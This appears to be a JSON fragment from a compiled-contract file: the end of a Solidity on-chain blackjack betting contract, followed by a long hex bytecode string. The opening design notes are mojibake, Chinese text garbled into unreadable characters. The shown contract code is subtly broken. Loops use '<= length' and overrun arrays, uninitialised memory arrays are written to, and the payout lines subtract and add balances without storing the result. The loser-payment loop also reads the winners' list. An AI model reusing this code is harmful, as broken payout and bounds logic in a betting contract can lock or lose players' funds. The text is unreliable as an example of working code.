¥ä¸åç©å®¶UserID(1~N) ç©å®¶å°åç¼åºåæå½æ¸ > èå®¶å°åç¼å½æ¸èª¿ç¨(æAUTOèªåèª¿ç¨) \n  \n1   Game creating \n    function_CreateAutoGame(GameId/ BettingsMax/BettingsMin) >Put Zero for none betting game =>ç©å®¶èª¿ç¨\n    function_CreateDualGame(GameId/ Player_UserId[]/BettingsMax/BettingsMin) > watting for answer =>èå®¶èª¿ç¨\n    \n    \n2-1 Round\n    function_CreateGameRound(Auto){ CreateGameRoundId}\n    function_PutBettings(GameId/ BettingAmount)=>1.ç¬¬ä¸è¼ªç©å®¶ä¸æ³¨ ä¸å®é¢é¢Betting=0 > ç©å®¶å°åç¼å½æ¸èª¿ç¨\n\n2-2 Round init card    \n    function_CreateRound_StartInitialCards(GameId/RoundId) returns(RoundId)èå®¶å°åç¼å½æ¸èª¿ç¨(æAUTOèªåèª¿ç¨)\n\n    è¦æPUBLIC VIEWçå ´é¢çç (Mapping__GameRoundId_GameRoundStruct[GameRoundId].Cards_InDealer Mapping__GameRoundId_GameRoundStruct[GameRoundId].PlayUnits.Cards_InHand/ )\n    \n2-3 Round deal card for each player\n    function_Round_PlayUnitControl(GameId/ RoundId / HitOrStand) > ç©å®¶å°åç¼å½æ¸èª¿ç¨ æèè¦æéº¼åæ§å¶èª¿ç¨é åº\n    \n    \n2-4 Round Dealer card and determain winner\n    function_Round_DealerControl(GameId/ RoundId / HitOrStand)\n    function_DeterminwinnerAndSendsMoney(Auto_After_DealerControl_Stand)\n    \n    function_CreateGameRound(Auto)\n\n    é²è¡éæ²\n    \n    é²è¡\"ä¸è¼ª\"\"(ç¢çRoundId) > èå®¶å°åç¼å½æ¸èª¿ç¨(æAUTOèªåèª¿ç¨)\n    1.ç©å®¶ä¸æ³¨(ä¸ç©é¢é¢å°±çç¥) > ç©å®¶å°åç¼å½æ¸èª¿ç¨\n    2.ä¸æ³¨å®æå¯å·è¡ç¼çè¡çº > ç©å®¶é½å©å¼µ> èå®¶1å¼µ  > èå®¶å°åç¼å½æ¸èª¿ç¨(æAUTOèªåèª¿ç¨)\n    \n    3.é²å¥è¿´å ç¬¬ä¸ä½ç©å®¶è¦ç åç \n    è¦æPUBLIC VIEWçå ´é¢çç (Mapping__GameRoundId_GameRoundStruct[GameRoundId].Cards_InDealer Mapping__GameRoundId_GameRoundStruct[GameRoundId].PlayUnits.Cards_InHand/ )\n    è¦ççæ§å¶è¨­è¨ æ¯å¦è¦åç©å®¶é ä¾åºè¦ç\n    \n    4.èå®¶è¦çåç  > èå®¶å°åç¼å½æ¸èª¿ç¨(æAUTOèªåèª¿ç¨)\n    \n    5.æ±ºå®è©²è¼ªåè²   > èå®¶å°åç¼å½æ¸èª¿ç¨(æAUTOèªåèª¿ç¨)\n    \n        é²è¡\"ä¸è¼ª\"\"(ç¢çæ°RoundId)\n}\n*/\n\n\n\n\n\n\n/* =================================================================\nContact HEAD : Integratwion User Workflow\n==================================================================== */\n\n// ----------------------------------------------------------------------------\n// Black jack Integrated User functionality Workflow\n// ----------------------------------------------------------------------------\n\ncontract Meowent_Blackjack_GamePlay is Blackjack_Functionality\n{\n\n\n\n    function Create_UserAccount (uint UserId, string memory UserName, string memory UserDescription) \n    public whenNotPaused\n    returns (uint _UserId, address _UserAddress, string memory _UserName, string memory _UserDescription)\n    {\n        require(Mapping__UserAddress_UserId[msg.sender] == 0);\n\n        (\n        uint Im_UserId, \n        address Im_UserAddress, \n        string memory Im_UserName, \n        string memory Im_UserDescription\n        ) \n        = Initialize_UserAccount\n        (\n            {_UserId: UserId,\n            _UserName: UserName,\n            _UserDescription: UserDescription}\n        );\n        \n        return (Im_UserId, Im_UserAddress, Im_UserName, Im_UserDescription);\n       }\n\n\n\n\n  \n    function Create_AutoGame (uint AutoGame_BettingRank) \n    public whenNotPaused\n    returns (bool _SuccessMessage, uint _CreateGameId) \n    {\n        uint _Im_MIN_BettingLimit = Mapping__AutoGameBettingRank_BettingRange[AutoGame_BettingRank][0];\n        uint _Im_MAX_BettingLimit = Mapping__AutoGameBettingRank_BettingRange[AutoGame_BettingRank][1];\n        uint[] memory _Im_AutoGamePlayer_UserId;\n        _Im_AutoGamePlayer_UserId[0] = Mapping__UserAddress_UserId[msg.sender];\n\n        bool _Im_message = Initialize_Game({_GameId: ImCounter_AutoGameId, \n        _Player_UserIds: _Im_AutoGamePlayer_UserId, \n        _Dealer_UserId: Mapping__UserAddress_UserId[address(this)], \n        _MIN_BettingLimit: _Im_MIN_BettingLimit, \n        _MAX_BettingLimit: _Im_MAX_BettingLimit});\n        \n        ImCounter_AutoGameId = ImCounter_AutoGameId + 1;\n        \n        return (_Im_message, ImCounter_AutoGameId);\n    }\n        \n\n\n\n    \n    function Create_DualGame \n    (\n        uint[] memory PlayerIds ,\n        uint MIN_BettingLimit ,\n        uint MAX_BettingLimit\n    ) \n        public whenNotPaused\n        returns (bool _SuccessMessage, uint _CreateGameId) \n        {\n        require(MIN_BettingLimit <= MAX_BettingLimit);\n        \n        uint _Im_DualGameCreater_UserId = Mapping__UserAddress_UserId[msg.sender];\n        \n        bool _Im_message = Initialize_Game({_GameId: ImCounter_DualGameId, \n        _Player_UserIds: PlayerIds, \n        _Dealer_UserId: _Im_DualGameCreater_UserId, \n        _MIN_BettingLimit: MIN_BettingLimit, \n        _MAX_BettingLimit: MAX_BettingLimit});\n\n        ImCounter_DualGameId = ImCounter_DualGameId + 1;\n        \n        return (_Im_message, ImCounter_DualGameId);\n    }\n    \n    \n    \n    \n    \n    function Player_Bettings(uint GameId, uint Im_BettingsERC20Ammount) \n    public whenNotPaused\n    returns (uint _GameId, uint GameRoundId, uint BettingAmount) \n    {\n        require(Im_BettingsERC20Ammount >= Mapping__GameUnitId_GameUnitStruct[GameId].MIN_BettingLimit && Im_BettingsERC20Ammount <= Mapping__GameUnitId_GameUnitStruct[GameId].MAX_BettingLimit);\n        \n        uint Im_GameId;\n        uint Im_GameRoundId;\n        uint Im_BettingAmount;\n        \n        (Im_GameId, Im_GameRoundId, Im_BettingAmount) = Bettings({_GameId: GameId,_Im_BettingsERC20Ammount: Im_BettingsERC20Ammount});\n        \n        return (Im_GameId, Im_GameRoundId, Im_BettingAmount);\n    }    \n    \n\n    \n    \n    \n    function Start_NewRound(uint GameId) \n    public whenNotPaused\n    returns (uint StartRoundId) \n    {\n        Game_Unit memory Im_GameUnitData= Mapping__GameUnitId_GameUnitStruct[GameId];\n        uint Im_GameRoundId = Im_GameUnitData.Game_RoundsIds[Im_GameUnitData.Game_RoundsIds.length -1];\n        uint[] memory Im_PlayerUserIdSet = Im_GameUnitData.Player_UserIds;\n        uint Im_MIN_BettingLimit = Im_GameUnitData.MIN_BettingLimit;\n        uint Im_MAX_BettingLimit = Im_GameUnitData.MAX_BettingLimit;\n\n        if (Im_MAX_BettingLimit == 0) \n        {\n            uint Im_NewRoundId = Initialize_Round({_ImGameRoundId: Im_GameRoundId, _Player_UserIds: Im_PlayerUserIdSet});\n            \n            return Im_NewRoundId;\n        } \n        else \n        {\n            \n            for(uint Im_PlayerCounter = 0; Im_PlayerCounter <= Im_PlayerUserIdSet.length; Im_PlayerCounter++) \n            {\n                uint Im_PlayerUserId = Im_PlayerUserIdSet[Im_PlayerCounter];\n                uint Im_UserBettingAmount = Mapping__GameRoundIdUserId_Bettings[Im_GameRoundId][Im_PlayerUserId];\n            \n                require(Im_UserBettingAmount >= Im_MIN_BettingLimit && Im_UserBettingAmount <= Im_MAX_BettingLimit);\n                \n                emit CheckBetting_Anouncement \n                (\n                    {GameRoundId: Im_GameRoundId, \n                    UserId: Im_PlayerUserId, \n                    UserBettingAmount: Im_UserBettingAmount, \n                    MinBettingLimit: Im_MIN_BettingLimit,\n                    MaxBettingLimit: Im_MAX_BettingLimit}\n                );\n            }\n            \n            uint Im_NewRoundId = Initialize_Round({_ImGameRoundId: Im_GameRoundId, _Player_UserIds: Im_PlayerUserIdSet});\n            \n            return Im_NewRoundId;\n        }\n        \n        return 0;\n    }\n    \n    \n    \n\n    \n    function Player_HitOrStand (uint GameId, bool Hit_or_Stand) \n    public whenNotPaused\n    returns (uint[] memory NewCards_InHand) \n    {\n        Game_Unit memory Im_GameUnit_Instance = Mapping__GameUnitId_GameUnitStruct[GameId];\n        uint Im_RoundId = Im_GameUnit_Instance.Game_RoundsIds[Im_GameUnit_Instance.Game_RoundsIds.length -1];\n        \n        Game_Round_Unit storage Im_GameRoundUnit_StorageInstance = Mapping__GameRoundId_GameRoundStruct[Im_RoundId];\n        \n        for (uint Im_PlayUnitCounter = 0; Im_PlayUnitCounter <= Im_GameUnit_Instance.Player_UserIds.length; Im_PlayUnitCounter++) \n        {\n            if (Mapping__UserAddress_UserId[msg.sender] == Im_GameRoundUnit_StorageInstance.Mapping__Index_PlayUnitStruct[Im_PlayUnitCounter].Player_UserId ) \n            {\n                if (Hit_or_Stand) \n                {\n                    Im_GameRoundUnit_StorageInstance.Mapping__Index_PlayUnitStruct[Im_PlayUnitCounter].Cards_InHand = GetCard({_Im_GameRoundId: Im_RoundId, _Im_Original_CardInHand: Im_GameRoundUnit_StorageInstance.Mapping__Index_PlayUnitStruct[Im_PlayUnitCounter].Cards_InHand});\n\n                    return Im_GameRoundUnit_StorageInstance.Mapping__Index_PlayUnitStruct[Im_PlayUnitCounter].Cards_InHand;\n                } \n                else if (Hit_or_Stand == false) \n                {\n                    Im_GameRoundUnit_StorageInstance.Mapping__Index_PlayUnitStruct[Im_PlayUnitCounter].Cards_InHand.push(1111);\n\n                    return Im_GameRoundUnit_StorageInstance.Mapping__Index_PlayUnitStruct[Im_PlayUnitCounter].Cards_InHand;\n                }\n            }\n        }\n    }\n   \n    \n    \n\n\n    function Dealer_HitOrStand (uint GameId, bool Hit_or_Stand) \n    public StandCheck_AllPlayer(GameId) whenNotPaused\n    returns (uint[] memory Cards_InDealerHand) \n    {\n        require(Mapping__UserAddress_UserId[msg.sender] == Mapping__GameUnitId_GameUnitStruct[GameId].Dealer_UserId);\n        \n        Game_Unit memory Im_GameUnit_Instance = Mapping__GameUnitId_GameUnitStruct[GameId];\n        \n        uint Im_RoundId = Im_GameUnit_Instance.Game_RoundsIds[Im_GameUnit_Instance.Game_RoundsIds.length -1];\n        Game_Round_Unit storage Im_GameRoundUnit_StorageInstance = Mapping__GameRoundId_GameRoundStruct[Im_RoundId];\n        \n        \n        uint Im_DealerUserId = Im_GameUnit_Instance.Dealer_UserId;\n        uint[] memory WeR_WinnerId;\n        uint[] memory WeR_LoserId;\n        \n        if (Hit_or_Stand) \n        {\n            Im_GameRoundUnit_StorageInstance.Cards_InDealer = GetCard({_Im_GameRoundId: Im_RoundId, _Im_Original_CardInHand: Im_GameRoundUnit_StorageInstance.Cards_InDealer});\n            \n            return Im_GameRoundUnit_StorageInstance.Cards_InDealer;\n        } \n        else if (Hit_or_Stand == false) \n        {\n            //Get winner and loser\n            (WeR_WinnerId, WeR_LoserId) = Determine_Result({_GameId: GameId,_RoundId: Im_RoundId});\n            \n            //Transfer moneymoney to winners\n            for(uint Im_WinnerCounter = 0; Im_WinnerCounter <= WeR_WinnerId.length ; Im_WinnerCounter++) \n            {\n                uint Im_WinnerUserId = WeR_WinnerId[Im_WinnerCounter];\n                uint Im_WinnerBettingAmount = Mapping__GameRoundIdUserId_Bettings[Im_RoundId][Im_WinnerUserId];\n                \n                Mapping__OwnerUserId_ERC20Amount[Im_DealerUserId] - Im_WinnerBettingAmount;\n                Mapping__OwnerUserId_ERC20Amount[Im_WinnerUserId] + Im_WinnerBettingAmount;\n            }\n            \n            //Transfer moneymoney from losers          \n            for(uint Im_LoserCounter = 0; Im_LoserCounter <= WeR_LoserId.length ; Im_LoserCounter++) \n            {\n                uint Im_LoserUserId = WeR_WinnerId[Im_LoserCounter];\n                uint Im_LoserBettingAmount = Mapping__GameRoundIdUserId_Bettings[Im_RoundId][Im_LoserUserId];\n                \n                Mapping__OwnerUserId_ERC20Amount[Im_DealerUserId] + Im_LoserBettingAmount;\n                Mapping__OwnerUserId_ERC20Amount[Im_LoserUserId] - Im_LoserBettingAmount;\n            }\n            \n            //Create New Round ID\n            ImCounter_GameRoundId = ImCounter_GameRoundId + 1;\n            Mapping__GameUnitId_GameUnitStruct[GameId].Game_RoundsIds.push(ImCounter_GameRoundId);\n\n            return Im_GameRoundUnit_StorageInstance.Cards_InDealer;\n        }\n    }\n\n}\n/* =================================================================\nContact HEAD : Integration User Workflow\n==================================================================== */\n//Worship Lu Goddess Forever",
  "bytecode": "61022060405260016080908152600260a052600360c052600460e0526005610100526006610120526007610140526008610160526009610180819052600a6101a08190526101c08190526101e0819052610200526200006091600d620000e7565b50722638522c84a7133d879720e86ca4f204c936d2601655601b8054600160a860020a0319166101003390810291909117909155601c8054600160a060020a03199081168317909155601d8054821683179055601e8054821683179055601f8054821683179055602080549091169091179055348015620000e057600080fd5b506200014f565b82600d81019282156200011d579160200282015b828111156200011d578251829060ff16905591602001919060010190620000fb565b506200012b9291506200012f565b5090565b6200014c91905b808211156200012b576000815560010162000136565b90565b613661806200015f6000396000f3fe6080604052600436106102cb576000357c010000000000000000000000000000000000000000000000000000000090048063506e624311610192578063858ed41f116100f9578063c0abb7b4116100b2578063dd62ed3e1161008c578063dd62ed3e14610e46578063ed21248c14610e81578063f812065414610e89578063f9329ca514610eaf576102cb565b8063c0abb7b414610ca3578063c72f0dd914610de4578063c7e45df314610e16576102cb565b8063858ed41f14610a23578063a0b1f66814610ad9578063a9059cbb14610b03578063b047fb5014610b3c578063b4c8e84214610b51578063b730aaaa14610c79576102cb565b80636a2dda871161014b5780636a2dda87146108dd57806370a082311461091357806375d77c511461094657806379f7c83d146109b45780637dc8fb72146109e45780638456cb5914610a0e576102cb565b8063506e62431461078457806351d20c7c146107b457806353ff9300146107d157806356aa772f146108815780635b6b431d1461089e5780635c975abb146108c8576102cb565b806323b872dd11610236578063355dd1b3116101ef578063355dd1b3146106e05780633849d852146106e85780633a7ee53f146106fd5780633f4ba83a1461071257806344536d27146107275780634e0a337914610751576102cb565b806323b872dd146105bf57806325ae31091461060257806326fffaee146106175780632738ed251461062c57806327d7874c1461067a5780632ba73c15146106ad576102cb565b806310abdb0a1161028857806310abdb0a146103e657806318160ddd146104685780631a8eb3251461047d57806320457aba146104925780632072863b146105625780632395c58614610595576102cb565b8063035e902d146102d05780630519ce791461030257806306ca9bba1461033357806306fc2e091461036f578063095ea7b3146103845780630a0f8168146103d1575b600080fd5b3480156102dc57600080fd5b50610300600480360360408110156102f357600080fd5b5080359060200135610eff565b005b34801561030e57600080fd5b50610317610f21565b60408051600160a060020a039092168252519081900360200190f35b34801561033f57600080fd5b5061035d6004803603602081101561035657600080fd5b5035610f30565b60408051918252519081900360200190f35b34801561037b57600080fd5b5061035d611158565b34801561039057600080fd5b506103bd600480360360408110156103a757600080fd5b50600160a060020a03813516906020013561115e565b604080519115158252519081900360200190f35b3480156103dd57600080fd5b50610317611214565b3480156103f257600080fd5b506104186004803603604081101561040957600080fd5b50803590602001351515611223565b60408051602080825283518183015283519192839290830191858101910280838360005b8381101561045457818101518382015260200161043c565b505050509050019250505060405180910390f35b34801561047457600080fd5b5061035d61170c565b34801561048957600080fd5b5061035d611713565b34801561049e57600080fd5b50610547600480360360608110156104b557600080fd5b8101906020810181356401000000008111156104d057600080fd5b8201836020820111156104e257600080fd5b8035906020019184602083028401116401000000008311171561050457600080fd5b9190808060200260200160405190810160405280939291908181526020018383602002808284376000920191909152509295505082359350505060200135611719565b60408051921515835260208301919091528051918290030190f35b34801561056e57600080fd5b506103006004803603602081101561058557600080fd5b5035600160a060020a0316611777565b3480156105a157600080fd5b5061035d600480360360208110156105b857600080fd5b50356117d8565b3480156105cb57600080fd5b506103bd600480360360608110156105e257600080fd5b50600160a060020a038135811691602081013590911690604001356117ea565b34801561060e57600080fd5b506103176118c5565b34801561062357600080fd5b5061035d6118d4565b34801561063857600080fd5b5061065c6004803603604081101561064f57600080fd5b50803590602001356118da565b60408051938452602084019290925282820152519081900360600190f35b34801561068657600080fd5b506103006004803603602081101561069d57600080fd5b5035600160a060020a031661194e565b3480156106b957600080fd5b50610300600480360360208110156106d057600080fd5b5035600160a060020a03166119ae565b610300611a0e565b3480156106f457600080fd5b5061035d611a84565b34801561070957600080fd5b50610317611a8a565b34801561071e57600080fd5b50610300611a9e565b34801561073357600080fd5b506105476004803603602081101561074a57600080fd5b5035611ac1565b34801561075d57600080fd5b506103006004803603602081101561077457600080fd5b5035600160a060020a0316611b54565b34801561079057600080fd5b5061035d600480360360408110156107a757600080fd5b5080359060200135611bb4565b61065c600480360360208110156107ca57600080fd5b5035611bd1565b3480156107dd57600080fd5b5061035d600480360360208110156107f457600080fd5b81019060208101813564010000000081111561080f57600080fd5b82018360208201111561082157600080fd5b8035906020019184602083028401116401000000008311171561084357600080fd5b919080806020026020016040519081016040528093929190818152602001838360200280828437600092019190915250929550611c82945050505050565b6103006004803603602081101561089757600080fd5b5035611d15565b3480156108aa57600080fd5b50610300600480360360208110156108c157600080fd5b5035611d4f565b3480156108d457600080fd5b506103bd611de0565b3480156108e957600080fd5b5061065c6004803603606081101561090057600080fd5b5080359060208101359060400135611de9565b34801561091f57600080fd5b5061035d6004803603602081101561093657600080fd5b5035600160a060020a0316611e5d565b34801561095257600080fd5b5061097f6004803603604081101561096957600080fd5b50600160a060020a038135169060200135611e83565b6040805195151586526020860194909452600160a060020a039092168484015260608401526080830152519081900360a00190f35b3480156109c057600080fd5b5061035d600480360360408110156109d757600080fd5b5080359060200135611fca565b3480156109f057600080fd5b5061035d60048036036020811015610a0757600080fd5b5035611fec565b348015610a1a57600080fd5b50610300611ffe565b61030060048036036040811015610a3957600080fd5b600160a060020a038235169190810190604081016020820135640100000000811115610a6457600080fd5b820183602082011115610a7657600080fd5b80359060200191846001830284011164010000000083111715610a9857600080fd5b91908080601f01602080910402602001604051908101604052809392919081815260200183838082843760009201919091525092955061208f945050505050565b348015610ae557600080fd5b5061035d60048036036020811015610afc57600080fd5b5035612154565b348015610b0f57600080fd5b506103bd60048036036040811015610b2657600080fd5b50600160a060020a0381351690602001356121ae565b348015610b4857600080fd5b50610317612276565b348015610b5d57600080fd5b50610b7b60048036036020811015610b7457600080fd5b5035612285565b6040518085815260200184600160a060020a0316600160a060020a031681526020018060200180602001838103835285818151815260200191508051906020019080838360005b83811015610bda578181015183820152602001610bc2565b50505050905090810190601f168015610c075780820380516001836020036101000a031916815260200191505b50838103825284518152845160209182019186019080838360005b83811015610c3a578181015183820152602001610c22565b50505050905090810190601f168015610c675780820380516001836020036101000a031916815260200191505b50965050505050505060405180910390f35b348015610c8557600080fd5b5061035d60048036036020811015610c9c57600080fd5b50356123c8565b348015610caf57600080fd5b50610b7b60048036036060811015610cc657600080fd5b81359190810190604081016020820135640100000000811115610ce857600080fd5b820183602082011115610cfa57600080fd5b80359060200191846001830284011164010000000083111715610d1c57600080fd5b91908080601f0160208091040260200160405190810160405280939291908181526020018383808284376000920191909152509295949360208101935035915050640100000000811115610d6f57600080fd5b820183602082011115610d8157600080fd5b80359060200191846001830284011164010000000083111715610da357600080fd5b91908080601f0160208091040260200160405190810160405280939291908181526020018383808284376000920191909152509295506123ea945050505050565b348015610df057600080fd5b5061041860048036036040811015610e0757600080fd5b50803590602001351515612444565b348015610e2257600080fd5b5061035d60048036036040811015610e3957600080fd5b508035906020013561274d565b348015610e5257600080fd5b5061035d60048036036040811015610e6957600080fd5b50600160a060020a038135811691602001351661276a565b6103006127a5565b61030060048036036020811015610e9f57600080fd5b5035600160a060020a03166127ee565b348015610ebb57600080fd5b50610ed960048036036020811015610ed257600080fd5b5035612832565b604080519485526020850193909352838301919091526060830152519081900360800190f35b601e54600160a060020a03163314610f1657600080fd5b602191909155602255565b602054600160a060020a031681565b601b5460009060ff1615610f4357600080fd5b610f4b6134dd565b600083815260026020908152604091829020825160c0810184528154815260018201805485518186028101860190965280865291949293858101939290830182828015610fb757602002820191906000526020600020905b815481526020019060010190808311610fa3575b505050505081526020016002820154815260200160038201548152602001600482015481526020016005820180548060200260200160405190810160405280929190818152602001828054801561102d57602002820191906000526020600020905b815481526020019060010190808311611019575b5050509190925250505060a08101518051919250600091600019810190811061105257fe5b602090810290910181015190830151606084015160808501519293509091801515611091576000611083858561285a565b965061115395505050505050565b60005b8351811161114657600084828151811015156110ac57fe5b6020908102909101810151600088815260068352604080822083835290935291909120549091508481108015906110e35750838111155b15156110ee57600080fd5b6040805188815260208101849052808201839052606081018790526080810186905290517fbf73ee341083da8383c8ea4cc5cd3d052d2c71fdef4dff8eb237260e00c5bb7d9181900360a00190a15050600101611094565b506000611083858561285a565b919050565b60195481565b601b5460009060ff161561117157600080fd5b8161117b33611e5d565b101561118657600080fd5b3360008181526020818152604080832054600160a060020a038816808552828520548286526004855283862080548a9003905560058552838620818752855294839020805489019055825188815292519195909390927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929081900390910190a36001925050505b92915050565b601d54600160a060020a031681565b60608261122e6134dd565b600082815260026020908152604091829020825160c081018452815481526001820180548551818602810186019096528086529194929385810193929083018282801561129a57602002820191906000526020600020905b815481526020019060010190808311611286575b505050505081526020016002820154815260200160038201548152602001600482015481526020016005820180548060200260200160405190810160405280929190818152602001828054801561131057602002820191906000526020600020905b8154815260200190600101908083116112fc575b5050509190925250505060a08101518051919250600091600019810190811061133557fe5b60209081029091018101516000818152600390925260408220909250905b60208401515181116113a457600081815260018301602052604090206002018054600019810190811061138257fe5b906000526020600020015461045714151561139c57600080fd5b600101611353565b50601b5460ff16156113b557600080fd5b60008781526002602081815260408084209092015433845290839052912054146113de57600080fd5b6113e66134dd565b600088815260026020908152604091829020825160c081018452815481526001820180548551818602810186019096528086529194929385810193929083018282801561145257602002820191906000526020600020905b81548152602001906001019080831161143e575b50505050508152602001600282015481526020016003820154815260200160048201548152602001600582018054806020026020016040519081016040528092919081815260200182805480156114c857602002820191906000526020600020905b8154815260200190600101908083116114b4575b5050509190925250505060a0810151805191925060009160001981019081106114ed57fe5b602090810290910181015160008181526003909252604091829020918401519092506060808b156115eb57611574858560020180548060200260200160405190810160405280929190818152602001828054801561156a57602002820191906000526020600020905b815481526020019060010190808311611556575b5050505050612a32565b805161158a916002870191602090910190613514565b50836002018054806020026020016040519081016040528092919081815260200182805480156115d957602002820191906000526020600020905b8154815260200190600101908083116115c5575b50505050509a50505050505050611702565b8b15156116fb576115fc8d86612b7b565b909250905060005b82518111611638576000838281518110151561161c57fe5b6020908102909101810151600490915260005250600101611604565b5060005b81518111611670576000838281518110151561165457fe5b602090810290910181015160049091526000525060010161163c565b506018805460019081019182905560008f81526002602081815260408084206005018054958601815584529281902090930193909355918601805483518184028101840190945280845290918301828280156115d957602002820191906000526020600020908154815260200190600101908083116115c55750505050509a50505050505050611702565b5050505050505b5050505092915050565b6019545b90565b60185481565b601b54600090819060ff161561172e57600080fd5b8284111561173b57600080fd5b3360009081526020819052604081205460175490919061175e9088848989612efe565b6017805460010190819055909890975095505050505050565b601c54600160a060020a0316331461178e57600080fd5b600160a060020a03811615156117a357600080fd5b601b8054600160a060020a039092166101000274ffffffffffffffffffffffffffffffffffffffff0019909216919091179055565b60046020526000908152604090205481565b601b5460009060ff16156117fd57600080fd5b600160a060020a0380851660009081526020818152604080832054338452818420549488168452818420548185526005845282852086865290935292205491929185111561184a57600080fd5b6000838152600560209081526040808320858452825280832080548990039055838352600482529182902080548801905581518781529151600160a060020a0389169233927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a35060019695505050505050565b601c54600160a060020a031681565b60165481565b601b546000908190819060ff16156118f157600080fd5b600085815260026020526040902060030154841080159061192357506000858152600260205260409020600401548411155b151561192e57600080fd5b600080600061193d8888613065565b919750955093505050509250925092565b601b546101009004600160a060020a0316331461196a57600080fd5b600160a060020a038116151561197f57600080fd5b601d805473ffffffffffffffffffffffffffffffffffffffff1916600160a060020a0392909216919091179055565b601b546101009004600160a060020a031633146119ca57600080fd5b600160a060020a03811615156119df57600080fd5b601f805473ffffffffffffffffffffffffffffffffffffffff1916600160a060020a0392909216919091179055565b6706f05b59d3b20000341115611a8257600080805b6002340260ff821611611a505760ff60028202169250818311611a4557611a50565b829150600101611a23565b50604051339082156108fc029083906000818181858888f19350505050158015611a7e573d6000803e3d6000fd5b5050505b565b60175481565b601b546101009004600160a060020a031681565b601c54600160a060020a03163314611ab557600080fd5b601b805460ff19169055565b601b54600090819060ff1615611ad657600080fd5b6000838152601a602090815260408083208054600190910154338552928490529083205460608051929490928391908110611b0d57fe5b6020908102909101810191909152601654306000908152918290526040822054611b3b919084908787612efe565b6016805460010190819055909650945050505050915091565b601b546101009004600160a060020a03163314611b7057600080fd5b600160a060020a0381161515611b8557600080fd5b601e805473ffffffffffffffffffffffffffffffffffffffff1916600160a060020a0392909216919091179055565b600660209081526000928352604080842090915290825290205481565b601b546000908190819060ff1615611be857600080fd5b6000655af3107a4000346019805492909104918201905560008681526004602090815260409182902080548401908190558251338152349281019290925281830188905260608201849052608082015290519192507f0b6714503365af9414d3800a7dbf6886fd5573f8f258df4ae054f9f42ac97161919081900360a00190a1600085815260046020526040902054949590949350915050565b60008080805b8451811015611cc0578481815181101515611c9f57fe5b906020019060200201519250611cb4836123c8565b90910190600101611c88565b5060005b8451811015611d0d578481815181101515611cdb57fe5b602090810290910101519250600d8306158015611cf95750600b8211155b15611d055781600a0191505b600101611cc4565b509392505050565b60215481148015611d27575060225434145b15611d4c576020805473ffffffffffffffffffffffffffffffffffffffff1916331790555b50565b601e54600160a060020a03163314611d6657600080fd5b3031811115611d7457600080fd5b604051339082156108fc029083906000818181858888f19350505050158015611da1573d6000803e3d6000fd5b50604080513381526020810183905281517ffe1d2295d712ce535932e904b35127409502473afa635912c4f36885e6fdcabe929181900390910190a150565b601b5460ff1681565b601b54600090819081906101009004600160a060020a03163314611e0c57600080fd5b60408051808201825286815260208082018790526000898152601a90915291909120611e3991600261355f565b5050506000848152601a602052604090208054600190910154949590949350915050565b600160a060020a0316600090815260208181526040808320548352600490915290205490565b601b54600090819081908190819060ff1615611e9e57600080fd5b33600090815260208181526040808320548084526004909252909120548711801590611ecb575060018710155b1515611ed657600080fd5b60008181526004602052604080822080548a90039055601980548a9003905551600160a060020a038a1690655921673020008a0280156108fc029184818181858888f1935050505090507f0b6714503365af9414d3800a7dbf6886fd5573f8f258df4ae054f9f42ac9716189896559216730200002848b60046000888152602001908152602001600020546040518086600160a060020a0316600160a060020a031681526020018581526020018481526020018381526020018281526020019550505050505060405180910390a1600082815260046020526040902054909991989765592167302000029650945092505050565b601a6020526000828152604090208160028110611fe357fe5b01549150829050565b60036020526000908152604090205481565b601f54600160a060020a03163314806120215750601d54600160a060020a031633145b806120365750601e54600160a060020a031633145b806120505750601b546101009004600160a060020a031633145b806120655750601c54600160a060020a031633145b151561207057600080fd5b601b5460ff161561208057600080fd5b601b805460ff19166001179055565b601b546101009004600160a060020a031633146120ab57600080fd5b81600160a060020a031634826040518082805190602001908083835b602083106120e65780518252601f1990920191602091820191016120c7565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d8060008114612148576040519150601f19603f3d011682016040523d82523d6000602084013e61214d565b606091505b5050505050565b60003341141561216357600080fd5b50604080514340602080830191909152336c01000000000000000000000000028284015260548083019490945282518083039094018452607490910190915281519101206034900690565b601b5460009060ff16156121c157600080fd5b816121cb33611e5d565b10156121d657600080fd5b33600090815260208181526040808320548084526004909252909120548311156121ff57600080fd5b600160a060020a038416600081815260208181526040808320548584526004835281842080548990039055808452928190208054880190558051878152905192939233927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef928290030190a3506001949350505050565b601f54600160a060020a031681565b6001602081815260009283526040928390208054818401546002808401805488516101009882161598909802600019011691909104601f81018690048602870186019097528686529195600160a060020a0390911694929383018282801561232e5780601f106123035761010080835404028352916020019161232e565b820191906000526020600020905b81548152906001019060200180831161231157829003601f168201915b5050505060038301805460408051602060026001851615610100026000190190941693909304601f81018490048402820184019092528181529495949350908301828280156123be5780601f10612393576101008083540402835291602001916123be565b820191906000526020600020905b8154815290600101906020018083116123a157829003601f168201915b5050505050905084565b600080600d830690506000600982600d81106123e057fe5b0154949350505050565b601b546000908190606090819060ff161561240457600080fd5b336000908152602081905260409020541561241e57600080fd5b60008060608061242f8b8b8b613177565b929e919d509b50909950975050505050505050565b601b5460609060ff161561245757600080fd5b61245f6134dd565b600084815260026020908152604091829020825160c08101845281548152600182018054855181860281018601909652808652919492938581019392908301828280156124cb57602002820191906000526020600020905b8154815260200190600101908083116124b7575b505050505081526020016002820154815260200160038201548152602001600482015481526020016005820180548060200260200160405190810160405280929190818152602001828054801561254157602002820191906000526020600020905b81548152602001906001019080831161252d575b5050509190925250505060a08101518051919250600091600019810190811061256657fe5b60209081029091018101516000818152600390925260408220909250905b6020840151518111611702576000818152600183016020908152604080832054338452918390529091205414156127455785156126be576126298383600101600084815260200190815260200160002060020180548060200260200160405190810160405280929190818152602001828054801561156a5760200282019190600052602060002090815481526020019060010190808311611556575050505050612a32565b8260010160008381526020019081526020016000206002019080519060200190612654929190613514565b506000818152600183016020908152604091829020600201805483518184028101840190945280845290918301828280156126ae57602002820191906000526020600020905b81548152602001906001019080831161269a575b505050505094505050505061120e565b85151561274557600081815260018084016020908152604080842060020180549384018155808552828520610457940193909355928490528154835181830281018301909452808452908301828280156126ae576020028201919060005260206000209081548152602001906001019080831161269a57505050505094505050505061120e565b600101612584565b600560209081526000928352604080842090915290825290205481565b600160a060020a0391821660009081526020818152604080832054939094168252838220549282526005815283822092825291909152205490565b6000